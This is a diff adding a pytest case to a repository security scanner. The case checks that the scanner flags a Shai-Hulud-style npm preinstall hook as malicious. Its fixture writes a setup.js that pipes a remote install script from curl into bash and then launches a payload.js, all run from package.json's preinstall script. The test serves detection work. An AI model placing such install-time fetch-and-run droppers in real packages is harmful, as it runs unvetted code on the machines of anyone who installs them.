@@ -158,6 +158,23 @@ async def test_scan_mixed_classifications(tmp_path):
     assert FileClassification.SCRIPT in classifications
 
 
+@pytest.mark.asyncio
+async def test_scan_preinstall_dropper_correlation(tmp_path):
+    """Shai-Hulud pattern: preinstall hook → dropper that downloads + executes."""
+    (tmp_path / "package.json").write_text('{"scripts": {"preinstall": "node setup.js"}}')
+    (tmp_path / "setup.js").write_text("""
+const { execSync, spawn } = require('child_process');
+execSync('curl -fsSL https://bun.sh/install | bash');
+spawn('bun', ['payload.js']);
+""")
+    scanner = RepoScanner(settings=_test_settings(tmp_path))
+    report = await scanner.scan(tmp_path)
+
+    assert report.aggregate_verdict == VerdictState.MALICIOUS
+    high_obs = [o for o in report.top_findings if o.severity.value in ("high", "critical")]
+    assert any("preinstall_dropper" in o.category for o in high_obs)
+
+
 def _test_settings(tmp_path):
     from security_scanner.config import Settings
     return Settings(
